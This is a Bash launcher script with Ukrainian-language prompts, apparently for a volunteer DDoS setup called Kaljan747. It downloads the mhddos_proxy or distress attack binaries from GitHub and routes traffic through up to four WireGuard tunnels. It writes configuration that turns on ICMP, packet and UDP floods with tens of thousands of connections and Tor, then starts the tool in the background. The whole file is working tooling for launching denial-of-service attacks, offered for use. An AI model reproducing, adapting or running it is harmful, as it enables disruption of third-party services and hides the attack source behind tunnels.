#!/bin/bash
set -e

# === Кольоровий вивід ===
print_header() {
    echo -e "\e[1;36m========================================"
    echo -e "🚀  Запуск Kaljan747"
    echo -e "========================================\e[0m"
}

print_summary() {
    echo -e "\n\e[1;33m----------------------------------------"
    echo -e "📦  Залежності: \e[1;32mOK\e[0m"
    echo -e "🌍  WG-конфіги: \e[1;32mOK\e[0m"
    echo -e "⚙️  PID: $1"
    echo -e "----------------------------------------\e[0m"
}

print_stage() {
    echo -e "\e[1;34m$1\e[0m"
}

SETTINGS_FILE="$HOME/.kaljan747_settings"
LOG_DIR="$HOME/logs"
LOG_FILE="$LOG_DIR/wg.log"
MODULE_DIR="$HOME/modules"
WG_DIR="$HOME/wg_confs"
mkdir -p "$LOG_DIR" "$MODULE_DIR" "$WG_DIR"
touch "$LOG_FILE"

set_permissions() {
    echo -e "\n📁  Права доступу..."
    sudo chmod -R 755 "$MODULE_DIR" "$WG_DIR" "$LOG_DIR"
    sudo chown -R "$USER:$USER" "$MODULE_DIR" "$WG_DIR" "$LOG_DIR"
    sudo chmod +x "$MODULE_DIR/mhddos_proxy" "$MODULE_DIR/distress" 2>/dev/null || true
    sudo chmod 644 "$MODULE_DIR"/*.ini "$LOG_FILE" 2>/dev/null || true
    echo -e "✅ Права доступу встановлено."
}

ask_user_id() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null; then
        USER_ID=$(zenity --entry --title="USER-ID" --text="Введіть ваш user-id:" --width=400)
    else
        read -p "Введіть ваш user-id: " USER_ID
    fi
}

ask_run_parameters() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null; then
        USER_SELECTION=$(zenity --forms --title="Kaljan747" \
            --add-combo="Модуль" --combo-values="mhddos_proxy|distress" \
            --add-combo="Редагувати INI?" --combo-values="Так|Ні" \
            --add-combo="Режим запуску" --combo-values="screen у фоні|screen відкрито|без screen" \
            --width=400)
        [ -z "$USER_SELECTION" ] && { echo "❌ Скасовано"; exit 1; }
        IFS="|" read -r SELECTED_MODULE EDIT_INI SELECTED_RUN_MODE <<< "$USER_SELECTION"
    else
        echo "1) mhddos_proxy | 2) distress"
        read -p "Ваш вибір (1/2): " mod_choice
        SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )

        echo "1) Так | 2) Ні"
        read -p "Редагувати INI (1/2): " edit_choice
        EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )

        echo "1) screen у фоні | 2) screen відкрито | 3) без screen"
        read -p "Режим запуску (1/2/3): " run_choice
        case "$run_choice" in
            1) SELECTED_RUN_MODE="screen у фоні";;
            2) SELECTED_RUN_MODE="screen відкрито";;
            3) SELECTED_RUN_MODE="без screen";;
        esac
    fi
}

# === Зчитування конфігу ===
[ -f "$SETTINGS_FILE" ] && source "$SETTINGS_FILE"

if [ -z "$USER_ID" ]; then
    while true; do
        ask_user_id
        [[ "$USER_ID" =~ ^[0-9]+$ ]] && break
        echo "USER-ID має містити лише цифри!"
    done
fi

if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ]; then
    ask_run_parameters
fi

print_header
echo -e "📥  USER-ID: \e[1;32m$USER_ID\e[0m"
echo -e "🧩  Модуль: \e[1;36m$SELECTED_MODULE\e[0m"
echo -e "🛠️  Режим: \e[1;36m$SELECTED_RUN_MODE\e[0m"

set_permissions

# === Пошук wg_confs ===
if [ ! -d "$WG_DIR" ]; then
    WG_DIRS=($(find "$HOME" -type d -name "wg_confs"))
    [ ${#WG_DIRS[@]} -eq 0 ] && WG_DIRS=($(find / -type d -name "wg_confs" 2>/dev/null))
    [ ${#WG_DIRS[@]} -eq 0 ] && { echo "❌ Папку wg_confs не знайдено"; exit 1; }

    if [ ${#WG_DIRS[@]} -gt 1 ]; then
        for i in "${!WG_DIRS[@]}"; do echo "$((i+1))) ${WG_DIRS[$i]}"; done
        read -p "Номер потрібної: " SELECTED_INDEX
        WG_DIR="${WG_DIRS[$((SELECTED_INDEX-1))]}"
    else
        WG_DIR="${WG_DIRS[0]}"
    fi

    sed -i '/^WG_DIR=/d' "$SETTINGS_FILE"
    echo "WG_DIR=\"$WG_DIR\"" >> "$SETTINGS_FILE"
fi

echo -e "📡  Папка WG: \e[1;36m$WG_DIR\e[0m"

# === Права root/sudo ===
[ "$(id -u)" -eq 0 ] && SUDO="" || SUDO="sudo"

# === Залежності ===
if command -v apt >/dev/null; then
    $SUDO apt update -y
    $SUDO apt install -y curl wget git screen sed wireguard zenity
else
    echo "❌ apt не знайдено"; exit 1
fi

print_stage "📦 Залежності встановлено"

# === Завантаження модуля ===
case "$SELECTED_MODULE" in
    mhddos_proxy)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
        ;;
    distress)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
        ;;
esac

[ -f "$MODULE" ] || wget -qO "$MODULE" "$LINK"
chmod +x "$MODULE"

# === Зупинка WG ===
for iface in $(wg show interfaces 2>/dev/null); do
    $SUDO wg-quick down "$iface" 2>/dev/null || true
    $SUDO ip link delete "$iface" 2>/dev/null || true
done

# === Підключення тунелів ===
check_wg_connection() {
    curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null
}

WG_FILES=($(find "$WG_DIR" -name "*.conf" | shuf))
WG_IFACES=()
INDEX=0

while [ "${#WG_IFACES[@]}" -lt 4 ] && [ "$INDEX" -lt "${#WG_FILES[@]}" ]; do
    conf="${WG_FILES[$INDEX]}"
    IFACE=$(basename "$conf" .conf)
    $SUDO wg-quick up "$conf" || true
    sleep 2
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

    if check_wg_connection "$IFACE"; then
        STATS=$(wg show "$IFACE" transfer | awk '{print $2, $3, $4}')
        echo "$TIMESTAMP ✅ $IFACE Працює | TX: $STATS" | tee -a "$LOG_FILE"
        WG_IFACES+=("$IFACE")
    else
        echo "$TIMESTAMP ❌ $IFACE Непрацює | Вимикається" | tee -a "$LOG_FILE"
        $SUDO wg-quick down "$IFACE" || true
        $SUDO ip link delete "$IFACE" || true
    fi
    INDEX=$((INDEX+1))
done

# === Перевірка інтерфейсів ===
echo "[DEBUG] WG_IFACES: ${WG_IFACES[*]}"
if [ "${#WG_IFACES[@]}" -eq 0 ]; then
    echo "❌ Жоден WG інтерфейс не активний"
    exit 1
fi

VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")

# === INI формування ===
echo "[DEBUG] VPN_LIST=$VPN_LIST"
echo "[DEBUG] VPN_LIST_COMMAS=$VPN_LIST_COMMAS"

echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"

# === Редагування ===
if [ "$EDIT_INI" = "Так" ]; then
    if [ -n "$DISPLAY" ]; then
        TMP=$(mktemp)
        zenity --text-info --editable --filename="$CONFIG_FILE" > "$TMP"
        mv "$TMP" "$CONFIG_FILE"
    else
        nano "$CONFIG_FILE"
    fi
fi

# === Запуск ===
echo -e "⚙️  Запуск модуля..."
ARGS=$(cat "$CONFIG_FILE")
case "$SELECTED_RUN_MODE" in
    "screen у фоні")   screen -dmS "$SELECTED_MODULE" bash -c "$MODULE $ARGS";;
    "screen відкрито") screen -S "$SELECTED_MODULE" bash -c "$MODULE $ARGS";;
    "без screen")      bash -c "$MODULE $ARGS" & ;;
esac

PID=$(pgrep -f "$MODULE")
print_summary "$PID"
exit 0
